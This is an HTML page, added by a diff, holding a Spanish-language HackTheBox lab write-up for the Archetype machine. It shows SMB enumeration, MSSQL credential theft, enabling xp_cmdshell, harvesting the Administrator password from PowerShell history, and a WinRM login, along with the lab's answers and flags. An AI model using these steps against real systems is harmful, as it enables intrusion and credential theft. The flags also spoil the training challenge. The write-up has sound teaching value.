@@ -1,0 +1,237 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Archetype HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/archetype.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Archetype HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Archetype de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Archetype de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Archetype HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Archetype HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Archetype de la plataforma de HackTheBox","headline":"Writeup Archetype HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Archetype HackTheBox</h1>
+          <p>Resolución de la máquina Archetype de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.95.187
+Nmap scan report for 10.129.95.187
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s
+5985/tcp open  wsman</span>
+</code></pre></div></div>
+
+<div><p>Listando recursos compartidos con smbclient podemos ver backups</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ smbclient</span><span class="p"> -N -L 10.129.95.187
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	</span><span class="kd">backups</span><span class="p">         Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un archivo de configuración asi que lo descargamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ smbclient</span><span class="p"> -N //10.129.95.187/backups
+Try "help" to get a list of possible commands.
+</span><span class="kd">smb: \></span><span class="p"> dir
+  .                                   D        0  Mon Jan 20 06:20:57 2020
+  ..                                  D        0  Mon Jan 20 06:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 06:23:02 2020
+
+		5056511 blocks of size 4096. 2609592 blocks available
+</span><span class="kd">smb: \></span><span class="p"> get prod.dtsConfig
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.5 KiloBytes/sec)
+</span><span class="kd">smb: \></span>
+</code></pre></div></div>
+
+<div><p>En el podemos ver credenciales para conectarnos a la base de datos mssql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">prod.dtsConfig 
+&ltDTSConfiguration>
+    &ltDTSConfigurationHeading>
+        &ltDTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    &lt/DTSConfigurationHeading>
+    &ltConfiguration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        &ltConfiguredValue>Data Source=.;Password=</span><span class="kd">M3g4c0rp123</span><span class="p">;User ID=</span><span class="kd">ARCHETYPE\sql_svc</span><span class="p">;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt/ConfiguredValue>
+    &lt/Configuration>
+&lt/DTSConfiguration></span>
+</code></pre></div></div>
+
+<div><p>Usando esas credenciales podemos conectarnos con mssqlclient de impacket</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-mssqlclient </span><span class="p">WORKGROUP/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+</span><span class="kd">SQL></span>
+</code></pre></div></div>
+
+<div><p>Autenticados podemos probar activar el servicio xp_cmdshell para ejecutar comandos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">SQL></span><span class="p"> enable_xp_cmdshell
+[*] INFO(ARCHETYPE): Configuration 'show advanced options' changed from 0 to 1.
+[*] INFO(ARCHETYPE): Configuration 'xp_cmdshell' changed from 0 to 1.
+</span><span class="kd">SQL></span>
+</code></pre></div></div>
+
+<div><p>Una vez hecho esto podemos ejecutar comandos en el sistema como el usuario sql_svc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">SQL> </span><span class="p">xp_cmdshell whoami
+output
+
+-------------------------------------------------------------------------------
+
+archetype\sql_svc
+
+</span><span class="kd">SQL></span>
+</code></pre></div></div>
+
+<div><p>Podemos ver los directorios de usuarios que existen solo sql_svc y Administrator</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">SQL> </span><span class="p">xp_cmdshell dir C:\Users
+output
+
+-------------------------------------------------------------------------------
+
+ Volume in drive C has no label.                    
+
+ Volume Serial Number is 9565-0B4F                  
+
+ Directory of C:\Users                              
+
+01/19/2020  03:10 PM    &ltDIR>          .            
+01/19/2020  03:10 PM    &ltDIR>          ..           
+01/19/2020  10:39 PM    &ltDIR>          Administrator
+01/19/2020  10:39 PM    &ltDIR>          Public       
+01/20/2020  05:01 AM    &ltDIR>          sql_svc      
+               0 File(s)              0 bytes       
+               5 Dir(s)  10,539,417,600 bytes free  
+
+</span><span class="kd">SQL></span>
+</code></pre></div></div>
+
+<div><p>En nuestro escritorio esta la flag podemos simplemente leerla</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">SQL> </span><span class="p">xp_cmdshell type C:\Users\sql_svc\Desktop\user.txt
+output
+
+-------------------------------------------------------------------------------
+
+3e7b102e78218e935bf3f4951fec21a3
+
+</span><span class="kd">SQL></span>
+</code></pre></div></div>
+
+<div><p>Podemos listar si existe un historial de powershell, nos devuelve la ruta</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">SQL> </span><span class="p">xp_cmdshell powershell.exe -c (Get-PSReadlineOption).HistorySavePath
+output
+
+-------------------------------------------------------------------------------
+
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+</span><span class="kd">SQL></span>
+</code></pre></div></div>
+
+<div><p>Al leer el historial podemos encontrar credenciales para Administrator</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">SQL> </span><span class="p">xp_cmdshell type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+output
+
+-------------------------------------------------------------------------------
+
+net.exe use T: \\Archetype\backups /user:</span><span class="kd">administrator MEGACORP_4dm1n!!</span><span class="p">
+exit                                                                   
+
+</span><span class="kd">SQL></span>
+</code></pre></div></div>
+
+<div><p>El puerto 5985 esta abierto, nos conectamos con las credenciales de Administrator y leemos la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ evil-winrm</span><span class="p"> -i 10.129.95.187 -u Administrator -p </span><span class="no">'MEGACORP_4dm1n!!'</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="no">whoami</span><span class="p">
+archetype\administrator
+PS C:\Users\Administrator\Documents> </span><span class="no">type</span><span class="p"> ..\Desktop\root.txt
+b91ccec3305e98240082d4474b848528
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div>
+
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>Which TCP port is hosting a database server?</strong></li>
+<ul><p></p><li>1433</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of the non-Administrative share available over SMB?</strong></li>
+<ul><p></p><li>backups</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the password identified in the file on the SMB share?</strong></li>
+<ul><p></p><li>M3g4c0rp123</li></ul></blockquote><br>
+
+<blockquote><li><strong>What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</strong></li>
+<ul><p></p><li>mssqlclient.py</li></ul></blockquote><br>
+
+<blockquote><li><strong>What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</strong></li>
+<ul><p></p><li>xp_cmdshell</li></ul></blockquote><br>
+
+<blockquote><li><strong>What script can be used in order to search possible paths to escalate privileges on Windows hosts?</strong></li>
+<ul><p></p><li>winpeas</li></ul></blockquote><br>
+
+<blockquote><li><strong>What file contains the administrator's password?</strong></li>
+<ul><p></p><li>ConsoleHost_history.txt</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit user flag</strong></li>
+<ul><p></p><li>3e7b102e78218e935bf3f4951fec21a3</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>b91ccec3305e98240082d4474b848528</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
